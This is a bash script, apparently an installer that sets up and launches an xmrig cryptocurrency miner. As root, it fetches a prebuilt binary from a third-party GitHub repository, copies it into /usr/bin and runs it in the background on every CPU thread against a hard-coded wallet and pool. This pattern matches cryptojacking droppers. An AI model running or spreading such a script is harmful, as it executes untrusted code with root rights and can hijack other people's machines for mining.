#! /bin/bash
if [ "$(whoami)" != "root" ]; then
        echo -e "\033[0;31mSorry, you are not root. Please use sudo option\033[0m"
        exit 1
fi
WALLET=Q010500349a4410bd5a9fcd7bbdb184a950fa4a265fbc3df5b7a6ce68defcdbf3a1000057e092ac
ID="$(hostname)"
MAIL=robbopp123@yahoo.com
PASSWORD=$ID
THREADS="$(nproc --all)"

echo 'vm.nr_hugepages=256' >> /etc/sysctl.conf
sudo sysctl -p
echo -e '\033[0;32m##### Installing updates and install soft...\033[0m'
sudo apt-get update && sudo apt-get install git libcurl4-openssl-dev build-essential libjansson-dev autotools-dev automake screen htop nano mc -y
sleep 2
cd /tmp && mkdir miner
git clone https://github.com/WilliamWizard/miner-xmr.git /tmp/miner
cd /tmp/miner
chmod +x /tmp/miner/xmrig
sleep 1
cp /tmp/miner/xmrig /usr/bin/
sleep 1
#xmrig -c /tmp/miner/config.json
xmrig -o qrl.herominers.com:10371 -u $WALLET --pass=$PASSWORD --threads=$THREADS -B -l /tmp/miner/qrl.log --donate-level=1 --print-time=10 --variant 1 -k 
echo -e '\033[0;32m##### Miner started \033[0m'
echo -e '\033[0;32m##### Watch: \033[0m'
echo -e '\033[0;32m##### tail -f /tmp/miner/xmrig.log \033[0m'
